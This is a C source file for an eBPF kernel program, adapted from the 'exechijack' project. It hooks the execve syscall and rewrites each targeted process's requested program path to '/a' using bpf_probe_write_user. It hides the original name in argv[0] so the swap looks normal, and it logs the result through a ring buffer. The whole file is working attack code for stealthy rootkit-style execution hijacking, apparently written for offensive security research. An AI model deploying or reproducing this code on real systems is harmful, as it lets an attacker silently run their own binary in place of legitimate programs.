/* SPDX-License-Identifier: BSD-3-Clause
 *
 * Adapted from: Pat Hogan @pathtofile, "exechijack"
 */

#include "vmlinux.h"
#include "execa_common.h"

#include <bpf/bpf_core_read.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>

char LICENSE[] SEC("license") = "Dual BSD/GPL";

// ringbuffer map to pass messages from kernel to user
struct {
  __uint(type, BPF_MAP_TYPE_RINGBUF);
  __uint(max_entries, 256 * 1024);
} rb SEC(".maps");

// optional target parent PID, e.g., your shell's PID
const volatile int target_ppid = 0;

/* function signature of syscall handler
 * SYSCALL_DEFINE3(execve,
	    const char __user *, filename,
	    const char __user *const __user *, argv,
	    const char __user *const __user *, envp)
 */
SEC("tp/syscalls/sys_enter_execve")
int handle_execve_enter(struct trace_event_raw_sys_enter* ctx)
{
  struct event* e = NULL;

  // fetch some info about the current task
  size_t pid_tgid = bpf_get_current_pid_tgid();
  struct task_struct* task = (struct task_struct*)bpf_get_current_task_btf();
  struct pt_regs* regs = (struct pt_regs*)bpf_task_pt_regs(task);
  u64 stack = (u64)BPF_CORE_READ(regs, sp);

  // check if we're a task of interest (user space's PID is kernel's
  // TGID)
  if (target_ppid != 0) {
    int ppid = BPF_CORE_READ(task, real_parent, tgid);
    if (ppid != target_ppid) {
      return 0;
    }
  }

  // read in program from first arg of execve
  char prog_name[MAX_FILENAME_LEN] = { 0 };
  bpf_probe_read_user(&prog_name, MAX_FILENAME_LEN, (void*)ctx->args[0]);
  prog_name[MAX_FILENAME_LEN - 1] = '\x00';
  bpf_printk("[EXECVE_HIJACK] filename <%s>", prog_name);

  // we need at least 3 bytes to write "/a\x00"
  if (prog_name[0] == '\x00' || prog_name[1] == '\x00') {
    bpf_printk("[EXECVE_HIJACK] program name too small");
    return 0;
  }

  // it might be the case that filename == argv[0], but we only want to
  // change the former, copy original filename into the wilderness
  // below the stack and point argv[0] there
  stack -= MAX_FILENAME_LEN;
  long ret = bpf_probe_write_user((void*)stack, &prog_name,
      MAX_FILENAME_LEN);
  if (ret) {
    bpf_printk("[EXECVE_HIJACK] failed to move old filename (%d)",
	ret);
    goto send_event;
  }
  u64 backup; // we might need to restore this one later
  bpf_probe_read_user(&backup, sizeof(u64), (void*)ctx->args[1]);
  ret = bpf_probe_write_user((void*)ctx->args[1], &stack, sizeof(u64));
  if (ret) {
    bpf_printk("[EXECVE_HIJACK] failed to change argv[0] (%d)",
	ret);
    goto send_event;
  }

  // now attempt to overwrite filename with hijacked binary path
  ret = bpf_probe_write_user((void*)ctx->args[0], "/a\0", 3);
  if (ret) {
    bpf_printk("[EXECVE_HIJACK] failed to overwrite filename (%d)\n",
	ret);
    // undo our earlier write
    bpf_probe_write_user((void*)ctx->args[1], &backup,
	sizeof(u64));
    goto send_event;
  }

send_event:
  e = (struct event*)bpf_ringbuf_reserve(&rb, sizeof(struct event), 0);
  if (e) {
    e->success = (ret == 0);
    e->pid = (pid_tgid >> 32);
    for (int i = 0; i < MAX_FILENAME_LEN; i++) {
      e->comm[i] = prog_name[i];
    }
    bpf_ringbuf_submit(e, 0);
  }

  return 0;
}
